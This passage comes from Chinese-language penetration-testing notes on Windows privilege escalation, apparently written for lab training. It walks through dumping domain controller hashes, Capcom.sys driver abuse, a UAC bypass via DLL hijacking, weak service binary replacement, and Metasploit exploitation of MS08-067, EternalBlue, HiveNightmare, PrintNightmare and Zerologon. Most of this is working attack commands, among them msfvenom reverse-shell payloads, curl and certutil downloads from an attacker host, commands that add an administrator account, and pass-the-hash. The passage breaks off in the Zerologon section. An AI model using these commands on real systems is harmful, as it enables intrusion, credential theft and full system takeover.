Mount-VHD -Path "C:\Temp\DC01_copy.vhdx" -ReadOnly
```

> 📝 掛載成功後，磁碟會出現在系統磁碟機列表。

***

#### ➡ 5️⃣ 尋找 NTDS.dit + SYSTEM hive 檔案 📂

```plaintext
E:\Windows\NTDS\ntds.dit
E:\Windows\System32\config\SYSTEM
```

> 👀 從掛載的磁碟取得這兩個檔案！

***

#### ➡ 6️⃣ 使用 secretsdump.py 提取 hash 🧰

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -just-dc LOCAL
```

✅ 輸出範例：

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
```

> 🎉 得到 NTLM Hash，準備橫向或離線破解！

***

#### ➡ 7️⃣ 使用 Pass-the-Hash 或 crack hash 🛡️

* 使用 hashcat 破解

```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
```

* 或直接 Pass-the-Hash 攻擊

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58 administrator@dc01.local
```

***

### ✅ 如果失敗，Debug 方法 🛠️：

| 問題               | 原因                     | 解決建議                          |
| ---------------- | ---------------------- | ----------------------------- |
| 掛載 VHDX 失敗       | 權限不足或檔案損壞              | 使用系統管理員 PowerShell，或確認路徑與檔案完好 |
| secretsdump 提取錯誤 | SYSTEM 或 ntds.dit 路徑錯誤 | 再確認掛載磁碟代號，重新指定路徑              |
| psexec 執行後無法登入   | hash 錯誤或域控無法連線         | 檢查網路與 hash 正確性；如有防火牆，可嘗試 RDP  |

</details>

<details>

<summary>Print Operators（列印操作員）權限利用</summary>

### 🏢 公司化概念

**Print Operators 群組 = 公司內部「列印管理部門 🖨️🏢」**\
這群人本來只是幫公司管理印表機 🖨️\
但 Windows 給他們的權限「超出本分」… 😱\
只要成為 Print Operators，就能加載驅動、啟動系統服務，\
進一步拿到 SYSTEM 權限 💀

***

### 🚀 攻擊流程圖

```
[1️⃣ 獲取 Print Operators 權限帳號（釣魚 / Hash 捕獲）]  
    │  
    ↓  
[2️⃣ 確認是否具有 SeLoadDriverPrivilege（whoami /priv）]  
    │  
    ↓  
[3️⃣ 使用 Capcom.sys 漏洞驅動準備提權]  
    │  
    ↓  
[4️⃣ 加入註冊表指向漏洞驅動（reg add）]  
    │  
    ↓  
[5️⃣ 啟用 SeLoadDriverPrivilege（執行 EnableSeLoadDriverPrivilege）]  
    │  
    ↓  
[6️⃣ 使用 ExploitCapcom.exe 執行 Shellcode，拿到 SYSTEM 權限]  
    │  
    ↓  
[7️⃣ SYSTEM 權限下 Dump Hash / Pass-the-Hash 橫向移動]  
```

***

### 👨‍🏫 攻擊步驟範例

#### ✅ 第一步：確認權限

```powershell
whoami /priv
```

確認 SeLoadDriverPrivilege 是否存在（雖然預設是 Disabled，但我們可以透過繞過方式啟用）。

***

#### ✅ 第二步：下載並設定漏洞驅動

執行 `EoPLoadDriver.exe` 以啟用 `SeLoadDriverPrivilege` 權限，建立註冊表項，並執行 `NTLoadDriver` ：

```cmd
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
```

或者手動建立註冊表

```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

設定 NT Object Path 指向漏洞驅動檔案。

***

#### ✅ 第三步：執行 `ExploitCapcom.exe`&#x20;

需要文件上傳&#x20;

```powershell
ExploitCapcom.exe
```

這將啟動具有系統權限的命令提示符，因此，學生現在可以讀取目錄 `C:\Users\Administrator\Desktop` 下的標誌檔案“flag.txt”，即 `Pr1nt_0p3rat0rs_ftw!` ：

***

#### ✅ 第六步：進行橫向移動

利用 CrackMapExec 或 Mimikatz Dump 出其他主機 NTLM Hash，進一步橫向移動與域控滲透。

***

### 💡 進階模式

若無法直接開啟 GUI，可以改寫 ExploitCapcom 程式碼，\
將原本的 `cmd.exe` 改成反向 Shell Payload 路徑，例如：

```c
TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

然後搭配 listener 取得反向連線！

***

### ⚠️ 藍隊防禦建議

| 防禦措施                                          | 原因                    |
| --------------------------------------------- | --------------------- |
| ✅ 嚴格審查 Print Operators 成員                     | 絕不讓非必要帳號進入此群組         |
| ✅ 偵測 reg add HKCU\System\CurrentControlSet 操作 | 建立 SIEM 規則監控異常註冊表修改行為 |
| ✅ 停用不必要服務 / 減少可利用服務                           | 降低被改寫執行路徑的攻擊面         |
| ✅ 檢查系統中不應存在的漏洞驅動 (如 Capcom.sys)               | 定期主動掃描驅動安全性           |
| ✅ AppLocker 禁止非簽章驅動載入                         | 減少惡意驅動注入的可能性          |

</details>

<details>

<summary>User Account Control（UAC）繞過</summary>

***

### 🏢 公司化概念（UAC 是什麼）

UAC（使用者帳戶控制）就像是**公司 IT 安全部門的審核機制**，\
當你要做一件高權限（例如：新增帳號、修改系統設定）行為時，\
系統會跳出：「請問你確定要同意嗎？」\
👉 但是，\
攻擊者只要找出**Windows 預設會自動信任的系統程式**，\
讓它去「間接」執行攻擊者的 DLL，\
UAC 就等於沒了…

***

### 🌳 攻擊流程樹狀圖

```
[1️⃣ 確認目標系統是否啟用 UAC]
 └─> REG QUERY HKEY_LOCAL_MACHINE\...\EnableLUA
     │
     ↓
[2️⃣ 確認 UAC 提示等級]
 └─> REG QUERY HKEY_LOCAL_MACHINE\...\ConsentPromptBehaviorAdmin
     │
     ↓
[3️⃣ 查詢系統版本與 Build]
 └─> PowerShell: [environment]::OSVersion.Version
     │
     ↓
[4️⃣ 對照 UACMe 技術表（找出可用漏洞）]
 └─> 選定 Technique #54 (SystemPropertiesAdvanced.exe + DLL 劫持)
     │
     ↓
[5️⃣ 利用 msfvenom 建立惡意 DLL]
 └─> 輸出為 srrstr.dll (反向 shell)
     │
     ↓
[6️⃣ 上傳惡意 DLL 至可寫入目錄]
 └─> WindowsApps 目錄
     │
     ↓
[7️⃣ 啟動 nc listener 接收反向連線]
 └─> nc -lvnp 8443
     │
     ↓
[8️⃣ 遠端觸發 SystemPropertiesAdvanced.exe]
 └─> 透過 WinRM / RDP / local cmd 執行
     │
     ↓
[9️⃣ 接收到 SYSTEM 等級權限反彈 shell]
```

***

### 🔎 每一步詳細步驟＋代碼＋背後原理

***

#### ✅ 步驟 1：確認 UAC 是否開啟

**為什麼要做？**\
👉 如果沒有開 UAC，就不需要繞過，直接提權即可。

**指令範例：**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

* 回傳 `0x1` 代表啟用，`0x0` 代表未啟用。

***

#### ✅ 步驟 2：確認 UAC 提示層級

* `ConsentPromptBehaviorAdmin` 的值說明：\
  \| 值 | 行為 | |------|-------------------------------------------------| | 0x0 | 自動批准（最危險） | | 0x2 | 只要登入為 admin，所有動作不提示 | | 0x5 | Always Notify（最安全） |

**範例指令：**

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

* 如果是 `0x2` 或 `0x0`，恭喜，非常容易利用！

***

#### ✅ 步驟 3：查 Windows 版本

```powershell
[environment]::OSVersion.Version
```

* 找到 `Major.Minor.Build`
* 比對 UACMe 可用技術 (例如 Technique #54 適用 14393 build)

***

#### ✅ 步驟 4：建立惡意 DLL

**目標：製作 srrstr.dll，裡面執行反向 shell。**\
**範例：**

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll -o srrstr.dll
```

* **LHOST**：你的攻擊機 IP
* **LPORT**：要監聽的 port
* 產生的 `srrstr.dll` 會在被執行時嘗試建立 TCP 連線。

***

#### ✅ 步驟 5：在受害主機下載惡意 DLL

```powershell
curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

* **為什麼放 WindowsApps？**\
  👉 因為 WindowsApps 資料夾在 PATH 內，程式搜尋 DLL 時會優先找此處。

***

#### ✅ 步驟 6：在攻擊端開 listener

```bash
nc -lvnp 8443
```

* 等待受害者執行時反連回來。

***

#### ✅ 步驟 7：觸發漏洞

**在受害機上執行自動提升程式**

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* 此程式會嘗試載入 `srrstr.dll`，就會不經同意提示執行我們的 DLL！

***

#### ✅ 步驟 8：接收反彈 shell

在你的 nc 視窗會看到：

```
connect to [10.10.14.3] from (UNKNOWN) [victim IP]
Microsoft Windows [Version 10.xxxxx]
C:\Windows\system32>
```

然後你就擁有 SYSTEM 等級 shell 🎉



### 🛠 如果 Debug 出錯怎麼辦？

* **沒有反彈？**
  * 確認防火牆有沒有擋住 port
  * 確認 LHOST 設對（不能設錯網卡 IP）
  * 確認 victim 可以 ping 到你的 LHOST
* **執行後 DLL 沒被呼叫？**
  * 確認 DLL 名稱是否正確 `srrstr.dll`
  * 確認放在有寫入權限且 PATH 裡的資料夾
* **nc 沒接到？**
  * 檢查 listener port
  * 改用其他 port，例如 53 / 443 比較容易通過防火牆

***

### ⚠ 藍隊防禦建議

| 防禦措施                                   | 原因                    |
| -------------------------------------- | --------------------- |
| 提高 UAC 設定（設為 0x5）                      | 避免較低層級容易被繞過           |
| 限制 PATH 可寫路徑                           | 防止 DLL 劫持             |
| 監控 `SystemPropertiesAdvanced.exe` 啟動事件 | 非正常時間啟動此程式可疑度極高，可進行告警 |
| 使用 AppLocker 限制 DLL 加載                 | 禁止未簽章 DLL 被系統自動加載     |

</details>

<details>

<summary>弱權限提權攻擊</summary>

### 🏢 公司化概念：

> 「弱權限」在 Windows 環境就像公司裡面：

* 重要資源（服務、執行檔、登錄檔）被設定為「任何人都可以修改 ✏️」
* 攻擊者一旦取得低權限帳號，就可以「偷偷更改」那些高權限服務執行的檔案或路徑，讓下次服務啟動時直接幫你執行惡意代碼。
* 通常發生在小公司自己寫的服務、第三方開源軟體或沒經過嚴格檢查的安裝程式。

***

### 🌳 弱權限提權攻擊流程樹

```
[1️⃣ 確認系統存在弱權限問題]
 ├─> 使用 SharpUp.exe 掃描
 ├─> 使用 icacls / accesschk 手動檢查
     │
     ↓
[2️⃣ 發現可修改的服務二進位路徑 / Registry 權限]
 ├─> 複製原本檔案備份
 ├─> 產生惡意 Payload (msfvenom or 自訂 .exe)
 ├─> 覆蓋到服務執行檔或改 binpath 為惡意指令
     │
     ↓
[3️⃣ 停止服務並重新啟動]
 └─> 攻擊者獲得 SYSTEM 權限或將自己加入 Administrators 群組
     │
     ↓
[4️⃣ 清理現場]
 ├─> 將 binpath 改回原本設定
 └─> 刪除惡意執行檔與歷史紀錄
```

***

### 🔎 實戰示範（完整範例）

#### ✅ 第一步：掃描弱權限

```powershell
.\SharpUp.exe audit
```

* 找 `Modifiable Service Binaries`、`Modifiable Services` 或 `Modifiable Registry Keys`

***

#### ✅ 第二步：用 icacls 檢查服務執行檔權限

```powershell
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

* 如果看到 Everyone:(F) 或 Users:(F) 表示任何人可寫入！非常嚴重⚠

***

#### ✅ 第三步：產生惡意 Payload

> 目標：透過反向 Shell 或加帳號

**🛠 反向 shell 範例：**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.80 LPORT=4444 -f exe > SecurityService.exe
```

**🛠 自動新增帳號範例（exe payload）：**

```bash
msfvenom -p windows/x64/exec CMD="net user pentest P@ssw0rd! /add && net localgroup Administrators pentest /add" -f exe -o adduser.exe
```

***

✅ 啟動一個 Python HTTP 伺服器



```shell-session
python3 -m http.server 8080
```

#### ✅ 第四步：用 `certutil.exe` 將惡意 `.exe` 檔案下載到 Windows 機器上

**➡**

```cmd-session
certutil.exe -f -urlcache http://10.10.14.80:8080/SecurityService.exe SecurityService.exe

****  Online  ****
CertUtil: -URLCache command completed successfully.
```

\


***

#### ✅ 第五步：原始文件 `C:\Program Files (x86)\PCProtect\SecurityService.exe` 替換為 `msfvenom` 產生的惡意可執行文件，然後啟動服務：

```cmd
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

***

#### ✅ 第六步：確認提權成功

```cmd
net localgroup administrators
```

* 如果看到你的帳號（pentest）在裡面，就是成功！🎉

***

### 🛠 Debug 指南

| 問題                    | 檢查項目                                                             |
| --------------------- | ---------------------------------------------------------------- |
| 啟動服務沒有反應或沒執行          | <p>1️⃣ binpath 格式是否正確？<br>2️⃣ 有無用 <code>sc start</code> 重啟服務</p> |
| 無法複製檔案或權限被拒           | <p>檢查檔案權限（icacls）；<br>確保目錄和執行檔為可寫</p>                            |
| 沒有顯示新帳號 / 反彈 shell 失敗 | <p>Payload 是否正確？<br>LHOST / LPORT 設定有無錯誤</p>                     |
| AccessChk 找不到服務       | - 請確認正確的服務名稱，並檢查服務狀態                                             |

</details>

<details>

<summary>Windows Kernel Exploits（內核漏洞提權）</summary>

### 🌳 攻擊流程樹狀圖（文字版）



```
[1️⃣ 判斷系統是否有缺陷]
 ├─> systeminfo / wmic / Get-Hotfix 查看 patch
 ├─> Google KB編號對照 CVE
 ├─> 使用漏洞查詢網站 (exploit-db / rapid7 / msrc)
     ↓
[2️⃣ 確認可利用的 CVE]
 ├─> 搜尋該系統適用的 Kernel Exploit
 ├─> 下載對應 exploit 程式碼
 ├─> 編譯或取得可執行檔
     ↓
[3️⃣ 嘗試利用]
 ├─> 本地提權 payload (如 HiveNightmare / PrintNightmare)
 ├─> 執行惡意 DLL / EXE
 ├─> 等待彈回 SYSTEM shell
     ↓
[4️⃣ 確認提權成功]
 └─> whoami / getuid / sysinfo 檢查
     ↓
[5️⃣ 清理現場]
 ├─> 刪除植入檔案
 └─> 還原修改設定
```

####

#### 1️⃣ 安裝 Python 環境（Linux 攻擊機 or Windows 都可）

👉 如果在 Kali 或 Parrot Linux：

```bash
sudo apt update
sudo apt install python3 python3-pip git
```

👉 如果在 Windows：

* 安裝 Python 3 ([https://www.python.org/downloads/](https://www.python.org/downloads/))
* 並記得在安裝時勾選「Add to PATH」

***

#### 2️⃣ 安裝 windows-exploit-suggester (WES) 工具

```bash
git clone https://github.com/bitsadmin/wesng.git
cd wesng
pip3 install -r requirements.txt
```

🔎 **為什麼這樣做？**\
`wesng` 是經常更新的自動化工具，透過比對 `systeminfo` 來找出系統漏洞。

***

#### 3️⃣ 更新漏洞資料庫（必要！）

```bash
python3 wes.py --update
```

* 會下載最新 `exploitdb.csv`
* 若出現錯誤，通常是網路或 Proxy 問題，檢查連線

***

### 4️⃣ Windows 端：收集系統信息

👉 在受害主機 (Windows) 上打開 `cmd`，執行：

```cmd
systeminfo > C:\Temp\systeminfo.txt
wmic qfe list full > C:\Temp\qfe.txt
```

🔎 為什麼：

* `systeminfo` 提供系統詳細資訊
* `wmic qfe` 提供熱修補紀錄

***

#### 5️⃣ 將檔案傳回 Linux 攻擊機器 (或者使用其他文件上傳方法)

```bash
scp user@victim_ip:C:\Temp\systeminfo.txt .
scp user@victim_ip:C:\Temp\qfe.txt .
```

或者透過 `meterpreter download` 拉回來。

***

#### 6️⃣ 開始智慧分析

```bash
cd wesng
python3 wes.py systeminfo.txt > wes_output.txt
```

🔎 為什麼這樣做？

* `wesng` 自動根據 `systeminfo.txt` 比對出「可利用漏洞 + Exploit URL + 缺失 KB」

***

#### 7️⃣ 自動化交叉比對：缺 KB 的確認

```bash
grep -oP 'KB\d+' wes_output.txt | sort -u > kb_list.txt
for kb in $(cat kb_list.txt); do grep $kb qfe.txt || echo "$kb 缺失，可以利用"; done > final_missing_kb.txt
```

✅ **結果範例（final\_missing\_kb.txt）：**

```
KB4493467 缺失，可以利用
KB3143141 已安裝
KB3045171 缺失，可以利用
```

***

### 8️⃣ 產出最終提權待辦清單

```bash
cat wes_output.txt | grep -E "CVE-|Exploit:" > final_exploit_list.txt
paste final_exploit_list.txt final_missing_kb.txt > ready_to_attack.txt
```

最後就可以打開 `ready_to_attack.txt`，看到：

```
CVE-2019-0803 | Exploit: https://www.exploit-db.com/exploits/47689 | KB4493467 缺失，可以利用
CVE-2016-0099 | Exploit: https://www.exploit-db.com/exploits/40049 | KB3143141 已安裝
```

#### ✅ 系統漏洞對照表 (Windows XP \~ Windows 11)

| 漏洞代碼                                     | XP           | 2003 | Vista | 2008 | 7 | 2008R2 | 8 | 8.1 | 2012 | 2012R2 | 10 | 2016 | 2019 | 10 | 11 | 備註                                       |
| ---------------------------------------- | ------------ | ---- | ----- | ---- | - | ------ | - | --- | ---- | ------ | -- | ---- | ---- | -- | -- | ---------------------------------------- |
| **MS08-067**                             | ●            | ●    |       |      |   |        |   |     |      |        |    |      |      |    |    | Server Service RPC 遠端執行漏洞，永恆藍基礎          |
| **MS17-010**                             |              |      |       |      | ● | ●      | ● | ●   | ●    | ●      | ●  | ●    | ●    | ●  | ●  | EternalBlue SMBv1 遠端執行漏洞                 |
| **CVE-2017-0213**                        |              |      |       |      | ● | ●      | ● | ●   | ●    | ●      | ●  | ●    | ●    | ●  | ●  | COM 聚合封送漏洞                               |
| **Hot Potato (Tater)**                   |              |      | ●     | ●    | ● | ●      | ● | ●   | ●    | ●      | ●  | ●    | ●    | ●  | ●  | Named Pipe 權限提升攻擊                        |
| **PrintNightmare (CVE-2021-34527)**      | IVvX5gwAhtQw |      |       |      | ● | ●      | ● | ●   | ●    | ●      | ●  | ●    | ●    | ●  | ●  | Print Spooler 驅動權限提升漏洞，任何認證帳戶可 SYSTEM    |
| **CVE-2020-1472 (Zerologon)**            |              |      |       |      |   |        |   |     | ●    | ●      | ●  | ●    | ●    | ●  |    | 網域控制器 Netlogon 權限提升漏洞                    |
| **HiveNightmare (CVE-2021-36934)**       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | SAM 可讀取漏洞，可本地提取密碼 hash                   |
| CVE-2021-34527 PrintNightmare            |              |      |       |      | ● |        |   |     |      | ●      |    | ●    |      | ●  |    |                                          |
| **Follina (CVE-2022-30190)**             |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | Office Word/Excel 0-day，透過 msdt URI 遠端執行 |
| **PetitPotam (CVE-2021-36942)**          |              |      |       |      |   |        |   |     | ●    | ●      | ●  | ●    | ●    | ●  | ●  | 強迫 NTLM relay 結合 AD CS 取得 SYSTEM 權限      |
| **CVE-2022-21999**                       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | Print Spooler 本地權限提升                     |
| **CVE-2023-28252**                       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | Win32k 利用漏洞 (APT 在野利用，影響 10/11 與 Server) |
| **CVE-2023-23397**                       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | Outlook NTLM 提前洩漏憑證漏洞 (APT 攻擊真實使用)       |
| **CVE-2023-24880**                       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | SmartScreen 繞過漏洞（APT 大量利用來逃避偵測）          |
| **CVE-2024-21410**                       |              |      |       |      |   |        |   |     | ●    | ●      | ●  | ●    | ●    | ●  | ●  | Exchange NTLM Relay 攻擊漏洞                 |
| **CVE-2024-21338**                       |              |      |       |      |   |        |   |     |      |        | ●  | ●    | ●    | ●  | ●  | Win32k.sys 提權漏洞 (APT 在野攻擊已利用)            |
| **ProxyNotShell (CVE-2022-41040/41082)** |              |      |       |      |   |        |   |     | ●    | ●      | ●  | ●    | ●    | ●  | ●  | Exchange 伺服器攻擊，結合 PowerShell RCE         |
| **BlueKeep (CVE-2019-0708)**             | ●            | ●    | ●     | ●    | ● | ●      |   |     |      |        |    |      |      |    |    | RDP 遠端執行漏洞，可藉由 RDP 傳送特製封包執行代碼            |



### ✅ 1️⃣ MS08-067 攻擊流程 & 教學

####

### 🏢 公司化概念：

MS08-067 是 **Windows Server 服務 RPC 處理漏洞**，\
允許攻擊者透過 SMB 通訊埠（TCP 445）對未授權系統進行**遠端程式碼執行**（RCE）。\
此漏洞存在於 **Windows XP、Windows 2000、Server 2003、Vista 以及部分 2008 系統**，\
**EternalBlue**（MS17-010）的前身與基礎，至今仍能在部分舊設備或醫療、工控系統中看到。

**如果 SMB 被防火牆封鎖，可透過內網橫向、VPN、或端口轉發方式繼續利用。**

***

### 🚀 MS08-067 攻擊流程圖 (文字版)

```
1️⃣ 確認目標 SMB 445 開啟
        ↓
2️⃣ 利用 nmap 確認系統版本
        ↓
3️⃣ 尋找 Metasploit 中的 MS08-067 模組
        ↓
4️⃣ 設定 RHOST、LHOST、PAYLOAD
        ↓
5️⃣ 執行 Exploit 嘗試溢位
        ↓
6️⃣ 獲取 Meterpreter 或反向 Shell
        ↓
7️⃣ 確認系統權限 (NT AUTHORITY\SYSTEM)
        ↓
8️⃣ Dump 哈希值 / 開始橫向移動
```

***

### 👨‍🏫 攻擊步驟範例 + 工具指令

***

#### 🔎 1️⃣ 掃描目標

```bash
nmap -p 445 --script smb-os-discovery <目標IP>
```

**目的**：確認目標 SMB 存活，並取得作業系統版本。\
👉 如果顯示為 **Windows 2000/XP/2003**，極有可能易受 MS08-067 攻擊。

***

#### 🔎 2️⃣ 確認漏洞是否存在

```bash
nmap -p 445 --script smb-vuln-ms08-067 <目標IP>
```

> 結果會提示目標是否可能存在漏洞。

***

#### ⚒ 3️⃣ 啟用 Metasploit

```bash
msfconsole
```

載入 MS08-067 模組：

```bash
use exploit/windows/smb/ms08_067_netapi
```

***

#### ⚙ 4️⃣ 設定參數

```bash
set RHOST <目標IP>
set LHOST <你的攻擊機IP>
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
```

👉 可以用 `show options` 檢查設定。

***

#### ✅ 5️⃣ 執行漏洞利用

```bash
exploit
```

> 成功時會看到：

```
[*] Sending stage (73728 bytes) to <目標IP>
[*] Meterpreter session 1 opened (<攻擊機IP>:4444 -> <目標IP>:xxxxx) at...
```

***

#### 🏁 6️⃣ 取得系統資訊

```bash
meterpreter > sysinfo
meterpreter > getuid
```

> 通常會顯示：

```
Server username: NT AUTHORITY\SYSTEM
```

代表已經取得最高系統權限！

***

#### 🗝 7️⃣ Dump 密碼哈希

```bash
meterpreter > hashdump
```

> 取得本機帳號與管理員的 NTLM 雜湊值，\
> 可用 John the Ripper / hashcat 嘗試破解。

***

#### 🔁 8️⃣ 橫向移動

* 使用 pass-the-hash / SMB relay 工具（ex: `psexec` 模組）
* 掃描其他主機並利用相同哈希或帳密

***

### ✅ 2️⃣ MS17-010 (EternalBlue) 攻擊流程 & 教學

### 🏢 公司化概念

MS17-010（俗稱 EternalBlue）是一個**SMBv1 遠端程式碼執行漏洞**，\
最初由美國 NSA 開發，後經「Shadow Brokers」洩漏，被勒索病毒 WannaCry 利用大規模爆發。

此漏洞出現在：

* Windows XP
* Windows 7
* Windows Server 2003 / 2008 / 2008R2
* 部分 Windows 8、10（早期版本）

攻擊者可透過 445 端口傳送特製封包，造成記憶體溢位並執行 SYSTEM 權限程式碼。\
👉 即便是在封閉網路內部環境，若系統未修補，極容易被內網橫向攻擊。

***

### 🚀 MS17-010 EternalBlue 攻擊流程圖（文字版）

```
1️⃣ 確認 445 端口開啟
       ↓
2️⃣ 使用 Nmap 掃描確認漏洞
       ↓
3️⃣ 啟動 Metasploit MS17-010 模組
       ↓
4️⃣ 設定目標、LHOST、LPORT、Payload
       ↓
5️⃣ 發送 Exploit 套件
       ↓
6️⃣ 取得 Meterpreter Shell
       ↓
7️⃣ 提權為 NT AUTHORITY\SYSTEM
       ↓
8️⃣ Dump 密碼雜湊，開始橫向滲透
```

***

### 👨‍🏫 攻擊步驟範例 + 指令解說

***

#### 🔎 1️⃣ 掃描目標 SMB 存活

```bash
nmap -p 445 <目標IP>
```

> 若有開啟 445 會看到 `open`，表示 SMB 可利用。

***

#### 🔎 2️⃣ 檢測是否有 MS17-010 漏洞

```bash
nmap -p 445 --script smb-vuln-ms17-010 <目標IP>
```

> 結果範例：

```
Host is likely VULNERABLE to MS17-010!
```

表示漏洞存在。

***

#### ⚒ 3️⃣ 啟用 Metasploit

```bash
msfconsole
```

載入模組：

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

***

#### ⚙ 4️⃣ 設定參數

```bash
set RHOST <目標IP>
set LHOST <你的IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
```

👉 下 `show options` 確認設定正確。

***

#### ✅ 5️⃣ 發動攻擊

```bash
exploit
```

> 成功時畫面：

```
[*] Sending stage (1188418 bytes) to <目標IP>
[*] Meterpreter session 1 opened (<你的IP>:4444 -> <目標IP>)
```

***

#### 🏁 6️⃣ 獲取系統控制

```bash
meterpreter > getuid
```

會看到：

```
Server username: NT AUTHORITY\SYSTEM
```

表示取得最高管理權限！

***

#### 🗝 7️⃣ Dump 哈希

```bash
meterpreter > hashdump
```

> 取得本機與管理員雜湊。

***

#### 🔁 8️⃣ 橫向移動

可透過 `psexec` 模組搭配 hash 開啟其他電腦：

```bash
bash複製編輯use exploit/windows/smb/psexec
set RHOST <橫向目標>
set SMBUser <帳號>
set SMBPass <雜湊>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <你的IP>
exploit
```

***

### ✅ 3️⃣ CVE-2021-36934 (HiveNightmare) 本地提權流程

#### 🏢【CVE-2021-36934 HiveNightmare 公司化概念】

Windows 10/11 系統權限配置錯誤，導致普通用戶可以讀取 SAM、SYSTEM、SECURITY Hive，取得本機帳號 Hash 後可破解密碼或 Pass-the-Hash，進一步橫向移動。

***

#### 🚀 【HiveNightmare 攻擊流程圖】

```
[偵測漏洞] 
    ↓
[檢查 SAM 權限 & 卷影副本]
    ↓
[使用 HiveNightmare PoC 提取 Hive]
    ↓
[回傳攻擊機解析 Hash]
    ↓
[Pass-the-Hash / 破解密碼 / 提權]
```

***

#### 👨‍🏫 【HiveNightmare 攻擊範例步驟】

1️⃣ 確認檔案權限

```bash
icacls c:\Windows\System32\config\SAM
```

結果中如果 `BUILTIN\Users:(I)(RX)`，代表易受攻擊。

2️⃣ 檢查是否存在 Shadow Copy

```powershell
vssadmin list shadows
```

3️⃣ 執行 HiveNightmare：

```powershell
.\HiveNightmare.exe
```

4️⃣ 使用 impacket-secretsdump 解析 Hash：

```bash
impacket-secretsdump -sam SAM-xxxx -system SYSTEM-xxxx -security SECURITY-xxxx local
```

5️⃣ 將 Hash crack 或用於 PTH：

```bash
hashcat -m 1000 hash.txt wordlist.txt
```

***

#### 🛠️ 工具推薦

* HiveNightmare.exe (GitHub 可下載)
* impacket-secretsdump
* hashcat / John The Ripper

***

#### 如果不成功 Debug 方法

* 確認系統是否有 Shadow Copy
* 驗證 SAM 是否可讀
* 執行 PowerShell 是否有足夠權限（可嘗試「以系統身份」執行）



### ✅ 3️⃣.1  CVE-2021-36934 (HiveNightmare) 本地提權流程



### 🏢【CVE-2021-34527 PrintNightmare 公司化概念】

允許任何經過身份驗證的使用者透過 RPC 方式在受害機器上以 SYSTEM 權限執行程式，常見攻擊手法：利用 PoC 直接新增本地管理員或上傳惡意 DLL。

***

#### 🚀 【PrintNightmare 攻擊流程圖】

```
[確認 Spooler 存在]
    ↓
[繞過執行策略]
    ↓
[執行 PowerShell Exploit]
    ↓
[成功新增本機管理員 / 執行自訂 DLL]
    ↓
[取得 SYSTEM 權限]
```

***

#### 👨‍🏫 【PrintNightmare 攻擊範例步驟】

1️⃣ 確認 Spooler 是否啟用：

```powershell
ls \\localhost\pipe\spoolss
```

2️⃣ 設定 PowerShell 繞過策略：

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

3️⃣ 匯入漏洞模組並執行：

```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

4️⃣ 驗證是否成功：

```powershell
net user hacker
```

***

#### 🛠️ 工具推薦

* cube0x0 的 PrintNightmare Exploit (GitHub)
* PowerSploit 中的權限提升模組
* impacket & Responder (搭配進階 NTLM Relay 攻擊)

***

#### 如果不成功 Debug 方法

* 確認 Print Spooler 是否啟用
* 檢查帳戶權限是否允許 SeLoadDriverPrivilege
* 執行時如出現拒絕存取，可試著用另一版本 PoC 或使用系統權限執行 PowerShell

### ✅ 5️⃣ CVE-2020-1472 (Zerologon) 攻擊流程

### 🏢 公司化概念

**Zerologon** 是 Netlogon 協定中的重大漏洞 (CVE-2020-1472)，\
允許攻擊者透過將身份驗證請求中的加密參數設定為全 0，\
在不需要帳戶憑證的情況下重設 Windows 網域控制器 (Domain Controller, DC) 的計算機密碼，\
接著透過該 DC 帳號取得網域管理員 (Domain Admin) 權限。

**影響範圍：**

* Windows Server 2012/2016/2019 (若未更新)
* 已加入網域的 Windows 系統

***

### 🚀 攻擊流程圖（文字版）

```
1️⃣ 偵測目標是否為網域控制器 (DC)
     ↓
2️⃣ 利用 Zerologon PoC 對目標執行 Netlogon 攻擊
     ↓
3️⃣ 將 DC 機器帳戶密碼重設 (置空)
     ↓
4️⃣ 使用 impacket-secretsdump 利用 DC 憑證
     ↓
5️⃣ 拿到完整網域管理員 hash / 密碼
     ↓
6️⃣ 使用 Pass-the-Hash 或 Kerberos ticket 橫向移動
```

***

### 👨‍🏫 攻擊步驟範例

#### 1️⃣ 確認目標是網域控制器

可透過 nmap 或 SMB 查詢

```bash
nmap -p 445 --script smb-enum-domains <target-ip>
```

或

```bash
rpcclient -U "" <target-ip>
```

***

#### 2️⃣ 使用 Zerologon 攻擊工具

